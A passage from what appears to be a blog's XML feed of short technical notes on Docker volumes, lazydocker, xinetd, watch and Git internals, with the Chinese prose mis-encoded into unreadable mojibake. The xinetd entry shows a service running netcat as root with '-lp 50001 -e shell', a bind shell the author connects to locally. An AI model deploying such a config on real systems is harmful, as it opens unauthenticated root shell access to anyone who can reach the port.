    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq32933432/article/details/12944205">å‚è€ƒ</a></p><h1 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h1><p>åœ¨æ²¡æœ‰åœ¨ <code>docker run</code> æ—¶ä½¿ç”¨ <code>-v</code> é€‰é¡¹æ—¶, åˆ›å»ºä¸€ä¸ªéšè—æ•°æ®å·.</p><h2 id="ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·"><a href="#ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·" class="headerlink" title="ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·"></a>ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·</h2><p>ä¹Ÿå°±æ˜¯æ²¡æœ‰æŒ‡å®šå®¿ä¸»æœºä¸Šé¢çš„æŸä¸€ä¸ªç›®å½•, å› æ­¤è‡ªåŠ¨åœ¨ <code>/var/lib/docker/volumes</code> ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªå·.</p><h2 id="VOLUME-çš„ä½œç”¨"><a href="#VOLUME-çš„ä½œç”¨" class="headerlink" title="VOLUME çš„ä½œç”¨"></a>VOLUME çš„ä½œç”¨</h2><p>æ¯”å¦‚æˆ‘ä»¬åœ¨ Dockerfile ä¸­å†™ <code>VOLUME [ &quot;/Blog&quot; ]</code>, å¹¶ä¸”åœ¨ run çš„æ—¶å€™æ²¡æœ‰æ·»åŠ  <code>-v</code> é€‰é¡¹, é‚£ä¹ˆåœ¨å®¹å™¨åˆ›å»ºå, ä¼šç”Ÿæˆ <code>/Blog</code> è¿™ä¸ªç›®å½•, ä»¥åŠåœ¨ <code>/var/lib/docker/volumes</code> ä¸‹ç”Ÿæˆä¸€ä¸ªå·, è¿™ä¸¤ä¸ªç›¸äº’æ˜ å°„.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-volume-ç†è§£</title>
    <link href="/2022/09/26/Docker-volume-%E7%90%86%E8%A7%A3/"/>
    <url>/2022/09/26/Docker-volume-%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/6iw9KU1">å‚è€ƒ</a></p><h1 id="ç†è§£"><a href="#ç†è§£" class="headerlink" title="ç†è§£"></a>ç†è§£</h1><h2 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h2><p>volume æ„Ÿè§‰å’ŒæŒ‚è½½ç±»ä¼¼, å¦‚æœå‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v ~<span class="hljs-regexp">/Blog:/</span>home<span class="hljs-regexp">/Blog ubuntu /</span>bin/bash<br></code></pre></td></tr></table></figure><p>å‰è€… <code>~/Blog</code> æ˜¯ä½ è‡ªå·±æœºå­ä¸Šçš„ç›®å½• (å³å®¿ä¸»æœºä¸Šçš„ç›®å½•), åè€… <code>/home/Blog</code> æ˜¯ docker å®¹å™¨å†…çš„ç›®å½•, å¦‚æœä½ è¿›å…¥å®¹å™¨, ç„¶åä¿®æ”¹äº† <code>/home/Blog</code> ä¸‹çš„æ–‡ä»¶, æ¯”å¦‚è¯´æ·»åŠ äº†ä¸€ä¸ªæ–‡ä»¶ <code>file.c</code> é‚£ä¹ˆå®¿ä¸»æœºä¸Šçš„ <code>~/Blog</code> ç›®å½•ä¸­ä¹Ÿä¼šç›¸åº”è¢«æ·»åŠ äº†ä¸€ä¸ª <code>file.c</code>, ä¸¤è€…å…±äº«äº†è¿™ä¸ªç›®å½•, åä¹‹åœ¨å®¿ä¸»æœºä¸Šæ“ä½œè¿™ä¸ªç›®å½•ä¹Ÿæ˜¯åŒç†.</p><h2 id="è‡ªå·±åˆ›å»º"><a href="#è‡ªå·±åˆ›å»º" class="headerlink" title="è‡ªå·±åˆ›å»º"></a>è‡ªå·±åˆ›å»º</h2><p>è‹¥æ˜¯ç”¨:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v <span class="hljs-regexp">/home/</span>Blog ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æŒ‡å®šæœ¬åœ°çš„ç›®å½•, é‚£ä¹ˆ docker ä¼šåœ¨ <code>/var/lib/docker/volumes/</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª volume, å¹¶ç”Ÿæˆä¸€ä¸ª ID ä½œä¸ºåç§°.</p><p>å¯ä»¥ç”¨ <code>docker volume</code> å‘½ä»¤æ¥ç®¡ç†å·.</p><p>ä¸Šé¢è®© docker åˆ›å»ºå·ä¹Ÿå¯ä»¥æŒ‡å®šåç§°:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v volumetest:<span class="hljs-regexp">/home/</span>Blog ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h2 id="æŒ‡å®šæƒé™"><a href="#æŒ‡å®šæƒé™" class="headerlink" title="æŒ‡å®šæƒé™"></a>æŒ‡å®šæƒé™</h2><p>æœ‰ <code>rw</code> (read and write) å’Œ <code>ro</code> (read only), å¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it --name test -v volumetest:<span class="hljs-regexp">/home/</span>Blog:ro ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h2 id="å¤šä¸ªå®¹å™¨ä¸­å…±äº«"><a href="#å¤šä¸ªå®¹å™¨ä¸­å…±äº«" class="headerlink" title="å¤šä¸ªå®¹å™¨ä¸­å…±äº«"></a>å¤šä¸ªå®¹å™¨ä¸­å…±äº«</h2><p>ä¸€ä¸ªå®¹å™¨åœ¨ <code>run</code> çš„æ—¶å€™, ç”¨ <code>--volume-from</code> è¿™ä¸€ä¸ªå‘½ä»¤æŒ‡å®šå¦ä¸€ä¸ªå®¹å™¨, å°±èƒ½è·å–å¦ä¸€ä¸ªå®¹å™¨çš„å…¨éƒ¨ volume.</p><p>å¦‚:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--name test2 --volume-from test1 ubuntu:20.04 /bin/bash</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-JekyII</title>
    <link href="/2022/09/25/%E4%BB%80%E4%B9%88%E6%98%AF-JekyII/"/>
    <url>/2022/09/25/%E4%BB%80%E4%B9%88%E6%98%AF-JekyII/</url>
    
    <content type="html"><![CDATA[<p><a href="https://jekyllrb.com/docs/">å®˜ç½‘</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>JekyII æ˜¯ä¸€ä¸ªé™æ€ç½‘ç«™ç”Ÿæˆå™¨.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>lazydocker-ä½¿ç”¨</title>
    <link href="/2022/09/25/lazydocker-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/25/lazydocker-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jesseduffield/lazydocker">Github ç›¸å…³é¡µ</a></p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>Arch Linux å¯ä»¥ç›´æ¥ç”¨ yay ä¸‹è½½:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>yay -S lazydocker<br></code></pre></td></tr></table></figure><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>é…ç½®æ–‡ä»¶åœ¨ ArchLinux ä¸Šä½äº <code>~/.config/lazydocker/config.yml</code>.</p><p>åœ¨ <a href="https://godoc.org/github.com/jesseduffield/lazydocker/pkg/config">è¿™ä¸ªç½‘ç«™</a> æŸ¥çœ‹æ‰€æœ‰å¯ä»¥é…ç½®çš„å‚æ•°.</p><p>å¯ä»¥é€šè¿‡ <code>lazydocker --config</code> æ¥æŸ¥çœ‹é»˜è®¤é…ç½®.</p><p>åœ¨ lazydocker é‡Œé¢å°±ä¸Šé¢é‚£ä¸€æ , é€šè¿‡ <code>e</code> å¯ä»¥ç›´æ¥ç¼–è¾‘é…ç½®æ–‡ä»¶.</p><h2 id="è‡ªå®šä¹‰-commands"><a href="#è‡ªå®šä¹‰-commands" class="headerlink" title="è‡ªå®šä¹‰ commands"></a>è‡ªå®šä¹‰ commands</h2><p>å¦‚:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">customCommands:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">bash</span><br>      <span class="hljs-attr">attach:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">command:</span> <span class="hljs-string">&#x27;docker exec -it <span class="hljs-template-variable">&#123;&#123; .Container.ID &#125;&#125;</span> bash&#x27;</span><br>      <span class="hljs-attr">serviceNames:</span> []<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xinetd-ç›¸å…³è¯´æ˜</title>
    <link href="/2022/09/25/xinetd-%E7%9B%B8%E5%85%B3%E8%AF%B4%E6%98%8E/"/>
    <url>/2022/09/25/xinetd-%E7%9B%B8%E5%85%B3%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1804980">å‚è€ƒ</a><br>åœ¨ Linux ä¸­ä¸€äº›ä¸é•¿æœŸä½¿ç”¨çš„æœåŠ¡, æ²¡æœ‰è¢«ä½œä¸ºå•ç‹¬çš„å®ˆæŠ¤è¿›ç¨‹åœ¨å¼€æœºæ—¶å¯ç”¨, Linux æŠŠè¿™äº›æœåŠ¡ç›‘å¬ç«¯å£å…¨éƒ¨ç”±ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ xinetd é›†ä¸­ç›‘å¬, å½“æ”¶åˆ°ç›¸åº”çš„å®¢æˆ·ç«¯è¯·æ±‚ä¹‹å, xinetd è¿›ç¨‹å°±ä¸´æ—¶å¯åŠ¨ç›¸åº”æœåŠ¡å¹¶æŠŠç›¸åº”ç«¯å£ç§»äº¤ç»™ç›¸åº”æœåŠ¡, å®¢æˆ·ç«¯æ–­å¼€ä¹‹å, ç›¸åº”çš„æœåŠ¡è¿›ç¨‹ç»“æŸ, xinetd ç»§ç»­ç›‘å¬.</p><p>ä¹Ÿå°±æ˜¯è¯´ç”¨æ¥ç®¡ç†ä¸€äº›æœåŠ¡, å°†ä¸€ä¸ªè¯·æ±‚ä¼ ç»™å…¶ä»–æœåŠ¡.</p><h2 id="å®ˆæŠ¤è¿›ç¨‹åˆ†ä¸ºä¸¤ç§å¤„ç†æ¨¡å¼"><a href="#å®ˆæŠ¤è¿›ç¨‹åˆ†ä¸ºä¸¤ç§å¤„ç†æ¨¡å¼" class="headerlink" title="å®ˆæŠ¤è¿›ç¨‹åˆ†ä¸ºä¸¤ç§å¤„ç†æ¨¡å¼"></a>å®ˆæŠ¤è¿›ç¨‹åˆ†ä¸ºä¸¤ç§å¤„ç†æ¨¡å¼</h2><ul><li>stand alone, è¯¥ç¨‹åºå§‹ç»ˆç›‘å¬, ä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€</li><li>super daemon, å§‹ç»ˆå¤„äº sleep çŠ¶æ€, çŸ¥é“æœ‰äººå”¤é†’.</li></ul><h2 id="ä»€ä¹ˆæ˜¯-xinetd"><a href="#ä»€ä¹ˆæ˜¯-xinetd" class="headerlink" title="ä»€ä¹ˆæ˜¯ xinetd"></a>ä»€ä¹ˆæ˜¯ xinetd</h2><p>å…¨ç§°ä¸º extended interet daemon.</p><p>æ˜¯ç½‘ç»œå®ˆæŠ¤è¿›ç¨‹æœåŠ¡ç¨‹åº, å¸¸ç”¨æ¥ç®¡ç†å¤šç§è½»é‡çº§ Internet æœåŠ¡.</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åŸåˆ™ä¸Šä»»ä½•ç³»ç»ŸæœåŠ¡éƒ½å¯ä»¥ä½¿ç”¨ xinetd, æœ€é€‚åˆçš„æ˜¯ Internet æœåŠ¡.j</p><p>å…·ä½“æœåŠ¡å¯ä»¥ä½¿ç”¨ xinetd æœåŠ¡åœ¨ <code>/etc/services</code> æ–‡ä»¶ä¸­æŒ‡å‡º. æ–‡ä»¶ä¸­è®°å½•çš„å†…å®¹ä¸º:</p><ul><li>ç½‘ç»œæœåŠ¡å</li><li>ä½¿ç”¨çš„ç«¯å£å·å’Œåè®®</li></ul><h2 id="etc-xinetd-conf-å’Œ-etc-xinetd-d"><a href="#etc-xinetd-conf-å’Œ-etc-xinetd-d" class="headerlink" title="/etc/xinetd.conf å’Œ /etc/xinetd.d/*"></a><code>/etc/xinetd.conf</code> å’Œ <code>/etc/xinetd.d/*</code></h2><p>xinetd çš„é…ç½®æ–‡ä»¶æ˜¯ <code>/etc/xinetd.conf</code> , ä½†å®ƒåªåŒ…æ‹¬å‡ ä¸ªé»˜è®¤å€¼åŠ <code>/etc/xinetd.d</code> ç›®å½•ä¸­çš„é…ç½®æ–‡ä»¶.</p><h2 id="é…ç½®-xinetd"><a href="#é…ç½®-xinetd" class="headerlink" title="é…ç½® xinetd"></a>é…ç½® xinetd</h2><h3 id="æ ¼å¼"><a href="#æ ¼å¼" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">service <span class="hljs-tag">&lt;<span class="hljs-name">service-name</span>&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;</span><br><span class="hljs-template-variable">    ...</span><br><span class="hljs-template-variable">&#125;</span><br></code></pre></td></tr></table></figure><p><code>service</code> æ˜¯å…³é”®å­—.</p><p>æ“ä½œç¬¦å¯ä»¥æ˜¯ <code>=</code>, <code>+=</code>, <code>-=</code>.</p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>é™¤äº†<code>/etc/xinetd.conf</code> å’Œ <code>/etc/xinetd.d/*</code> å¤–è¿˜æœ‰ <code>/etc/hosts.allow</code> åŠ <code>/etc/hosts.deny</code></p><h3 id="ç¦ç”¨å’Œå¯ç”¨"><a href="#ç¦ç”¨å’Œå¯ç”¨" class="headerlink" title="ç¦ç”¨å’Œå¯ç”¨"></a>ç¦ç”¨å’Œå¯ç”¨</h3><p>disabled åˆ—è¡¨å’Œ enabled åˆ—è¡¨.</p><h1 id="å‚è€ƒ-Bç«™"><a href="#å‚è€ƒ-Bç«™" class="headerlink" title="å‚è€ƒ Bç«™"></a><a href="https://b23.tv/FuT3XPw">å‚è€ƒ Bç«™</a></h1><p>åœ¨æˆ‘çš„ <code>/etc/xinetd.conf</code> æ–‡ä»¶é‡Œ, å†…å®¹ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs conf"># /etc/xinetd.conf<br>#<br><br>defaults<br>&#123;<br>        instances               = 60<br>        log_type                = SYSLOG authpriv<br>        log_on_success          = HOST PID<br>        log_on_failure          = HOST<br>        cps                     = 25 30<br>&#125;<br><br>includedir /etc/xinetd.d<br></code></pre></td></tr></table></figure><p>æœ€åä¸€è¡Œçš„è¿™ä¸ª <code>includedir</code> è¡¨ç¤º xinetd ç®¡ç†çš„, æœåŠ¡çš„ xinetd é…ç½®æ‰€åœ¨çš„ç›®å½•.</p><p>æŸ¥çœ‹è¿™ä¸ªç›®å½•:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dos">$ ls /etc/xinetd.d/<br>chargen<br>chargen-udp<br>daytime<br>daytime-udp<br>discard<br>discard-udp<br><span class="hljs-built_in">echo</span><br><span class="hljs-built_in">echo</span>-udp<br>servers<br>services<br><span class="hljs-built_in">time</span><br><span class="hljs-built_in">time</span>-udp<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚, å¦‚æœè¦è®© xinetd ç®¡ç† telnet æœåŠ¡, åœ¨ <code>/etc/xinetd.d/</code> ç›®å½•ä¸‹æ·»åŠ ä¸€ä¸ªæ–‡ä»¶, å« <code>telnet</code>, ç„¶å¥½æ·»åŠ å†…å®¹ (è¿™é‡Œ <code>#</code> åœ¨å®é™…ä¸­å¯èƒ½å¹¶ä¸æ˜¯æ³¨é‡Šç¬¦):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">service telnet<br>&#123;<br>    flags = REUSE                   <span class="hljs-comment"># è¡¨ç¤ºåå¯¹, ä½œç”¨ä¸çŸ¥</span><br>    socket_type = stream            <span class="hljs-comment"># ä½¿ç”¨çš„ TCP/IP socket ç±»å‹, å€¼å¯èƒ½ä¸º stream(TCP), dgram(UDP), raw, seqpacket</span><br>    <span class="hljs-keyword">wait</span> = <span class="hljs-keyword">no</span>                       <span class="hljs-comment"># no å³å¹¶è¡Œè¿æ¥, yes ä¸ºä¸²è¡Œè¿æ¥</span><br>    user = root                     <span class="hljs-comment"># è®¾ç½®æœåŠ¡è¿›ç¨‹çš„ UID</span><br>    server =<span class="hljs-regexp">/usr/</span>bin/in.telnetd     <span class="hljs-comment"># æœåŠ¡çš„å‘½ä»¤æ‰€åœ¨ä½ç½®</span><br>    log_on_failure += USERID        <span class="hljs-comment"># æŒ‡å®šå¤±è´¥æ—¶ç™»è®°çš„ä¿¡æ¯</span><br>    disable = <span class="hljs-keyword">no</span>                    <span class="hljs-comment"># è¡¨ç¤ºæœåŠ¡æ˜¯å¦å¼€å¯ yes/no</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€æœ‰ä¿¡æ¯å¯ä»¥åœ¨ <code>man xinetd.conf</code> ä¸­æŸ¥çœ‹.</p><p>è¿˜æœ‰å‡ ä¸ªæ¯”è¾ƒå¸¸ç”¨:</p><ul><li><code>server_args</code>, ä¼ ç»™ <code>server</code> çš„å‚æ•°</li><li><code>port</code>, å¦‚æœ <code>/etc/services</code> é‡Œé¢åˆ—å‡ºäº†æœåŠ¡çš„ port, å¿…é¡»å’Œå…¶ä¸€æ ·</li></ul><p>ä¸¾ port çš„ä¾‹å­, å¦‚æœ service æ˜¯è¿™æ ·å†™çš„:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">service netcat<br>&#123;<br>   <span class="hljs-built_in"> port </span>= 50000<br>    flags = REUSE                   <br>    socket_type = stream             <br>    wait = <span class="hljs-literal">no</span>                       <br>   <span class="hljs-built_in"> user </span>= root                     <br>   <span class="hljs-built_in"> server </span>=/usr/bin/netcat<br>    server_args = -lp 50001 -e shell<br>    log_on_failure += USERID        <br>    <span class="hljs-built_in">disable</span> = <span class="hljs-literal">no</span>                    <br>&#125;<br></code></pre></td></tr></table></figure><p>ä½ åœ¨å¦ä¸€ä¸ªç»ˆç«¯å‘ 50000 ç«¯å£å‘èµ·è¿æ¥:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nc localhost <span class="hljs-number">50000</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>ä½ å‘ç° <code>ls</code> æ²¡æœ‰å‡ºç°ç»“æœ, å› ä¸ºè¿æ¥ 50000 ç«¯å£åªæ˜¯æ¿€æ´» <code>netcat</code> è¿™ä¸ªæœåŠ¡, ç„¶åå†ç”¨:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nc localhost <span class="hljs-number">50001</span> <br><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>å‘ç°æˆåŠŸè¿æ¥åˆ° shell.</p><p>å¯ä»¥è®¾ç½®, å…è®¸è°è®¿é—®, è°ä¸èƒ½è®¿é—®, æœ€å¤§è¿æ¥æ•°, æ¯ä¸ª IP èƒ½æœ‰å‡ ä¸ªè¿æ¥, ä»€ä¹ˆæ—¶é—´è¿æ¥, æœåŠ¡ç«¯å£ç­‰.</p><h2 id="å¯åŠ¨-xinetd-æœåŠ¡"><a href="#å¯åŠ¨-xinetd-æœåŠ¡" class="headerlink" title="å¯åŠ¨ xinetd æœåŠ¡"></a>å¯åŠ¨ xinetd æœåŠ¡</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> systemctl <span class="hljs-built_in">start</span> xinetd<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰å“ªäº›ç«¯å£æ˜¯æ‰“å¼€çš„:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>netstat -ntpl<br></code></pre></td></tr></table></figure><p><code>-n</code> æ˜¯ <code>--numeric</code>, æ˜¾ç¤ºæ•°å­—åœ°å€è€Œä¸æ˜¯ symbolic.</p><p><code>-p</code> æ˜¯ <code>--program</code>, æ˜¾ç¤º socket æ‰€å±çš„ PID.</p><p><code>-l</code> æ˜¯ <code>--listening</code>, åªæ˜¾ç¤ºç›‘å¬ socket. å…·ä½“çœ‹ <code>man netstat</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>watch-å‘½ä»¤çš„éƒ¨åˆ†ä½¿ç”¨</title>
    <link href="/2022/09/25/watch-%E5%91%BD%E4%BB%A4%E7%9A%84%E9%83%A8%E5%88%86%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/25/watch-%E5%91%BD%E4%BB%A4%E7%9A%84%E9%83%A8%E5%88%86%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><code>-n</code> (interval) å‚æ•°, æŒ‡å®šæ—¶é—´, å¦‚:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ watch -n <span class="hljs-string">.5</span> tree <span class="hljs-string">.git</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git-å†…éƒ¨åŸç†</title>
    <link href="/2022/09/25/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86/"/>
    <url>/2022/09/25/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/3fH8R93">å‚è€ƒ</a><br>ç”¨å“ˆå¸Œç®—æ³•, åˆ©ç”¨æ–‡ä»¶å†…å®¹ (å’Œæ–‡ä»¶åæ— å…³) ç”Ÿæˆå“ˆå¸Œå€¼, ä¿è¯æ¯æ¬¡æäº¤çš„ç‹¬ç«‹å’Œå®Œæ•´.</p><p>æ¯æ¬¡æäº¤éƒ½ä¼šç”Ÿæˆå½“å‰æ‰€æœ‰æ–‡ä»¶çš„å¿«ç…§, å¹¶ä¿å­˜å¿«ç…§çš„ç´¢å¼•, å¦‚æœæœ‰äº›æ–‡ä»¶æ²¡æœ‰ä¿®æ”¹, git å°±ä¸ä¼šå­˜å‚¨é‚£ä¸ªæ–‡ä»¶, è€Œåªæ˜¯ä¿ç•™ä¸€ä¸ªé“¾æ¥, æŒ‡å‘ä¹‹å‰å­˜å‚¨çš„æ–‡ä»¶.</p><p>Git æ˜¯ä¸€ä¸ªå†…å®¹å¯»å€æ–‡ä»¶ç³»ç»Ÿ, å…¶æ ¸å¿ƒéƒ¨åˆ†æ˜¯é”®å€¼å¯¹æ•°æ®åº“.</p><p>åœ¨ object è¿™ä¸ªç›®å½•ä¸‹, å‡ ä¸ªç±»å‹çš„å¯¹è±¡, blob, tree, commit.</p><p>blob å¯¹è±¡è®°å½•æ–‡ä»¶å†…å®¹, tree å¯¹è±¡è®°å½• blob çš„ç›¸å…³ä¿¡æ¯, commit å¯¹è±¡è®°å½• tree çš„ç›¸å…³ä¿¡æ¯.</p><p>å³:</p><ul><li>Commit : ä½œè€…, ä¿¡æ¯, æŒ‡é’ˆ</li><li>Tree : ä¸€ä¸ªæŒ‡å‘æ–‡ä»¶å, å†…å®¹å’Œå…¶ä»– tree çš„æŒ‡é’ˆ</li><li>Blob : æ•°æ®</li></ul><p><code>git add</code> å‘½ä»¤çš„ä½œç”¨å°±æ˜¯åœ¨ä»£ç ä»“åº“ç”Ÿæˆä¸€ä¸ª blob èŠ‚ç‚¹, å¹¶ä¿®æ”¹ tree çš„æŒ‡é’ˆ.</p><h2 id="åˆ†æ”¯"><a href="#åˆ†æ”¯" class="headerlink" title="åˆ†æ”¯"></a>åˆ†æ”¯</h2><p>master æŒ‡é’ˆæ‰€å¤„çš„ä½ç½®, <code>.git/refs/heads/master</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> .git/refs/heads/master</span><br></code></pre></td></tr></table></figure><p>å°±èƒ½çœ‹åˆ° master æ‰€æŒ‡çš„åœ°æ–¹.</p><p>æ‰€ä»¥åˆ†æ”¯å…¶å®å°±æ˜¯æŒ‡å‘ä¸åŒ commit çš„æŒ‡é’ˆ.</p><h1 id="Pro-Git-æœ€åä¸€ç« "><a href="#Pro-Git-æœ€åä¸€ç« " class="headerlink" title="Pro Git æœ€åä¸€ç« "></a>Pro Git æœ€åä¸€ç« </h1>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å­¦è‡ª-learngitbranching-è¿™ä¸ªç½‘é¡µ</title>
    <link href="/2022/09/25/%E5%AD%A6%E8%87%AA-learngitbranching-%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5/"/>
    <url>/2022/09/25/%E5%AD%A6%E8%87%AA-learngitbranching-%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5/</url>
    
